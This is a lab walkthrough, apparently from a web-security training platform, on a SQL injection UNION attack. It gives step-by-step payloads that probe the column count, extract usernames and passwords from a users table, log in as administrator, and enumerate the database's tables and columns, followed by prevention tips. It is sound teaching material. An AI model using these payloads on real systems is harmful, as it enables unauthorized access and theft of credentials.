
# 💥 Lab Walkthrough: SQL Injection UNION Attack — Retrieving Data from Other Tables

> **Lab Title:** SQL injection UNION attack, retrieving data from other tables

> **Difficulty:** Practitioner

> **Status:** ✅ Solved

> **Goal:** Use a SQL injection UNION attack to extract usernames and passwords from the `users` table and log in as the `administrator`.


## 🎯 Objective

You've already determined:
- The query returns **2 columns**
- Both columns accept **string data**

Now it's time to exploit this vulnerability to:
1. Retrieve all **usernames and passwords** from the `users` table
2. Log in as the **administrator** using the stolen credentials

This lab simulates how attackers can extract **sensitive internal data** through vulnerable input fields.

## 🔍 Background

The vulnerable application uses a product category filter like:

```
GET /category?category=Electronics
```

Behind the scenes, it runs a query similar to:

```sql
SELECT name, description FROM products WHERE category = 'Electronics'
```

Since the results are returned in the application’s response, we can use a `UNION SELECT` attack to inject additional data — such as usernames and passwords.

## 🛠 Step-by-Step Guide

### 🔹 Step 1: Confirm SQLi Vulnerability

Start by testing if the parameter is injectable:

```
GET /category?category=Electronics'
```

➡️ If you get an error or unusual behavior → Vulnerable ✅

Try bypassing the rest of the query:

```
GET /category?category=Electronics'--
```

➡️ If the page loads normally → Confirmed injection point ✅

### 🔹 Step 2: Determine Number of Columns

Use the `UNION SELECT NULL` method:

```
GET /category?category='+UNION+SELECT+NULL,NULL--
```

✅ If successful → Query returns **2 columns**

### 🔹 Step 3: Test Which Columns Accept Strings

Inject test strings into each column:

```
GET /category?category='+UNION+SELECT+'abc',NULL--
GET /category?category='+UNION+SELECT+NULL,'def'--
GET /category?category='+UNION+SELECT+'abc','def'--
```

👀 Look for where `'abc'` or `'def'` appears on the page — this tells you which column accepts string values.

➡️ In this case, **both columns accept strings** — perfect for extracting usernames and passwords!

### 🔹 Step 4: Inject Payload to Extract User Data

Now that you know the structure, inject this payload:

```
GET /category?category='+UNION+SELECT+username,password+FROM+users--
```

💡 This appends the contents of the `users` table to the original query result.

## 🧾 Example Response

After injecting, you see something like this in the app:

| Username | Password |
|-------------|---------------------|
| administrator | 5talssvnxxxxxxxxx |
| carlos | 9kmanmkhc2xxxxxxxxxx |
| wiener | 4upxqmikqxxxxxxxxxx |

🎉 You’ve successfully extracted all usernames and passwords!

## 🔐 Step 5: Log in as Administrator

Go to the login page and enter:

- **Username:** `administrator`
- **Password:** `5talssvxxxxxxxxx`

✅ Successfully logged in as admin!

## 📊 Summary Table

| Step | Goal | Technique |
|------|------|-----------|
| 1 | Confirm vulnerability | `'` and `'--` payloads |
| 2 | Find number of columns | `UNION SELECT NULL,NULL--` |
| 3 | Check usable columns | Inject `'test'` into each |
| 4 | Extract user data | `UNION SELECT username,password FROM users--` |
| 5 | Log in as admin | Use retrieved credentials |

## 🧠 Why This Works

Modern databases allow attackers to:
- Enumerate database structure
- Extract sensitive data via `UNION SELECT`
- Bypass authentication systems

By chaining together earlier steps (column count + string-compatible columns), you were able to pull off a full **data exfiltration attack**.

## 🛡️ Prevention Tips

To stop this kind of attack:

- ✅ Always use **parameterized queries** or ORM libraries
- ✅ Validate and sanitize all inputs
- ✅ Never expose raw SQL errors to users
- ✅ Limit database permissions — avoid using admin accounts in web apps
- ✅ Use a Web Application Firewall (WAF) to detect common SQLi patterns

## 📚 Bonus: Advanced SQLi Techniques

Once you're comfortable with basic UNION attacks, try these next:

| Goal | Payload |
|------|---------|
| Get DB version | `' UNION SELECT NULL, version()--` |
| List all tables | `' UNION SELECT NULL, table_name FROM information_schema.tables--` |
| Get column names | `' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--` |
